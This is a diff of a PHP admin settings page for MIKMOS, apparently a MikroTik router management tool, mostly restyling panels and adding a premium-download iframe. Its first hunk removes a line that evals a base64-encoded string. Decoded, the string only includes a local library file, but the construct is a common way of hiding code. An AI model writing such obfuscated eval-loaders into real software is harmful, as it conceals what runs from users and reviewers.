@@ -1,5 +1,4 @@
 <?php
-eval("?>".base64_decode("PD9waHAgaW5jbHVkZSJsaWIvZnVsbC5waHAiOz8+"));
 error_reporting(0);
 @session_start();
 @ob_start("ob_gzhandler");
@@ -24,13 +23,12 @@ _e('<script>window.location.replace("./?index=login");</script>');
 }
 switch($_GET['index']){
 default:
-//echo cek_update();
 include("load/t_atas.php");
 include("load/t_menu_adm.php");
 ?>
 <div class="row">
 <div class="col-sm-12">
-<section class="panel">
+<div class="panel">
 <header class="panel-heading">
 <strong><?php echo __WELLCOME;?>, <?php echo $_SESSION['username'];?></strong>
 <span class="tools pull-right">
@@ -40,22 +38,62 @@ include("load/t_menu_adm.php");
 <p class="text-muted">
 <?php if($_SESSION['connect']=='connect'){ ?> 
 <a class="btn btn-danger" href="./?load=home"> <i class="fa fa-dashboard"></i> <?php echo __DASHBOARD;?></a>
-<a class="btn btn-primary" href="./settings.php?index=mikrotik"> <i class="fa fa-wifi"></i> <?php echo __ROUTER;?></a>
-<a class="btn btn-warning" href="./settings.php?index=administrator"> <i class="fa fa-key"></i> <?php echo __ADM;?></a>
 <?php }else{ ?>
 <a class="btn btn-danger" href="./settings.php?index=mikrotik"> <i class="fa fa-close"></i> Ganti Router</a>
 <?php } ?>
-</p><hr>
+</p>
+<hr>
 <div class="row">
 <div class="col-md-6">
 
-
-<?php load_router($_ROUTER, "./inc/ip_mk/", "on"); ?>
-<?php load_adm("./inc/adm/"); ?>
-<?php load_teleg(); ?>
+<div class="row">
+<div class="col-md-6">
+<a class="color-white" href="./?index=backup" title="BACKUP">
+<div class="card p-20" style="background-color:#20B2AA"><div class="media widget-ten"><div class="media-left meida media-middle"><span class="color-white"><i class="fa fa-file-zip-o f-s-40"></i></span></div>
+<div class="media-body media-text-right">
+<h2 class="color-white">BACKUP</h2>
+</div>
+</div> 
+</div>
+</a>
 </div>
 <div class="col-md-6">
+<a class="color-white" href="./settings.php?index=administrator" title="ADMIN">
+<div class="card p-20" style="background-color:#34a853"><div class="media widget-ten"><div class="media-left meida media-middle"><span class="color-white"><i class="fa fa-users f-s-40"></i></span></div>
+<div class="media-body media-text-right">
+<h2 class="color-white">ADMIN</h2>
+</div>
+</div>
+</div>
+</a>
+</div>
+<div class="col-md-6">
+<a class="color-white" href="./settings.php?index=mikrotik" title="ROUTER">
+<div class="card p-20" style="background-color:#fa8564"><div class="media widget-ten"><div class="media-left meida media-middle"><span class="color-white"><i class="fa fa-server f-s-40"></i></span></div>
+<div class="media-body media-text-right">
+<h2 class="color-white">ROUTER</h2>
+</div>
+</div>
+</div>
+</a>
+</div>
+<div class="col-md-6">
+<a class="color-white" href="./settings.php?index=telegram" title="BACKUP">
+<div class="card p-20" style="background-color:#0088cc"><div class="media widget-ten"><div class="media-left meida media-middle"><span class="color-white"><i class="fa fa-telegram f-s-40"></i></span></div>
+<div class="media-body media-text-right">
+<h2 class="color-white">TELEGRAM</h2>
+</div>
+</div>
+</div>
+</a>
+</div>
+</div>
+</div>
+<div class="col-md-6">
+<?php
 
+
+?>
 <table class="table table-striped" style="font-weight:600">
 <tr><td>MIKMOS Versi</td><td> <?php echo versi_off('versi');?></td></tr>
 <tr><td>Update</td><td><?php echo versi_off('tanggal');?></td></tr>
@@ -66,7 +104,7 @@ include("load/t_menu_adm.php");
 </div>
 </div>
 </div>
-</section>
+</div>
 </div>
 </div>
 <?php 
@@ -78,7 +116,7 @@ include("load/t_menu_adm.php");
 ?>
 <div class="row">
 <div class="col-sm-12">
-<section class="panel">
+<div class="panel">
 <header class="panel-heading">
 <strong><?php echo __ADM;?></strong>
 <span class="tools pull-right"></span>
@@ -142,7 +180,7 @@ echo '<style>.panel-body{display:none;}</dstyle>';
 </script>
 <div class="row">
 <div class="col-sm-12">
-<section class="panel">
+<div class="panel">
 <header class="panel-heading">
 <strong><?php echo __ADM;?></strong>
 <span class="tools pull-right"></span>
@@ -171,7 +209,7 @@ echo '<style>.panel-body{display:none;}</dstyle>';
 <tr>
 <td></td><td>
 <div>
-<a class="btn btn-warning" href="./settings.php?index=mikrotik"> <i class="fa fa-close btn-mrg"></i> Close</a>
+<a class="btn btn-warning" href="./settings.php?index=administrator"> <i class="fa fa-close btn-mrg"></i> Close</a>
 <button type="submit" name="edit" class="btn btn-primary btn-mrg" ><i class="fa fa-save btn-mrg"></i> Edit</button>
 </div>
 </td>
@@ -196,7 +234,7 @@ include("load/t_menu_adm.php");
 ?>
 <div class="row">
 <div class="col-sm-12">
-<section class="panel">
+<div class="panel">
 <header class="panel-heading">
 <strong><?php echo __TELEGRAM;?></strong>
 <span class="tools pull-right"></span>
@@ -218,6 +256,7 @@ Telegram
 </table>
 </div>
 </div></div></div></div>
+</div>
 <?php
 include("load/t_bawah.php");
 break;
@@ -251,7 +290,7 @@ echo '<style>.panel-body{display:none;}</style>';
 ?>
 <div class="row">
 <div class="col-sm-12">
-<section class="panel">
+<div class="panel">
 <header class="panel-heading">
 <strong><?php echo __TELEGRAM;?></strong>
 <span class="tools pull-right"></span>
@@ -329,7 +368,7 @@ $API = new RouterosAPI();
 $API->debug = false;
 if ($API->connect($_IPMK, $_USMK, _de(ltrim($_PSMK, __CMS)))) {
 $_SESSION['connect'] = 'connect';
-_e('<script>window.location.replace("./?load=home");</script>');
+_e('<script>window.location.replace("./settings.php?index");</script>');
 }else{
 $_SESSION['connect'] = 'noconnect';
 _e('<script>window.location.replace("./settings.php?index");</script>');
@@ -344,7 +383,7 @@ include("load/t_menu_adm.php");
 <div class="row">
 <div class="col-12">
 <div class="card">
-<div class="card-body"> Status tidak terhubung ke Router, silahkan setting kembali Router yang akan digunakan <?php echo $_SESSION['connect'] ;
+<div class="panel-body"> Status tidak terhubung ke Router, silahkan setting kembali Router yang akan digunakan <?php echo $_SESSION['connect'] ;
 ;?></div>
 </div>
 </div>
@@ -358,7 +397,7 @@ include("load/t_menu_adm.php");
 ?>
 <div class="row">
 <div class="col-sm-12">
-<section class="panel">
+<div class="panel">
 <header class="panel-heading">
 <strong><?php echo __ROUTER;?></strong>
 <span class="tools pull-right">
@@ -774,7 +813,7 @@ echo "<script>window.location='./?index=login'</script>";
 <header class="panel-heading">
 <strong><?php echo __REBOOT;?></strong>
 </header>
-<div class="card-body">
+<div class="panel-body">
 					
 <div class="table-responsive">
 <div class="adv-table">
@@ -784,6 +823,30 @@ echo "<script>window.location='./?index=login'</script>";
 </div>
 <button onclick="return confirm('Anda yakin untuk me-Reboot Mikrotik <?php echo $_ROUTER;?>?')" class="btn bg-danger" type="submit" title="Reboot" name="reboot"><i class="fa fa-power-off"></i> Reboot</button>
 </form>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<?php
+include("load/t_bawah.php");
+break;
+case'premium':
+include("load/t_atas.php");
+include("load/t_menu_adm.php");
+?>
+<div class="row">
+<div class="col-sm-12">
+<div class="panel">
+<header class="panel-heading">
+<strong><?php echo __PREMIUM;?> <?php echo __DOWNLOAD;?></strong>
+</header>
+<div class="panel-body">
+<hr>
+<div class="table-responsive">
+<div class="adv-table">
+<iframe style="border:none;color:#fff!important;" height="450" width="100%" src="<?php _e(_Mikmos_Web(0));?><?php _e(_Get_Pre(0));?>?index=premium&klien=<?php _e(get());?>"></iframe>
 </div>
 </div>
 </div>
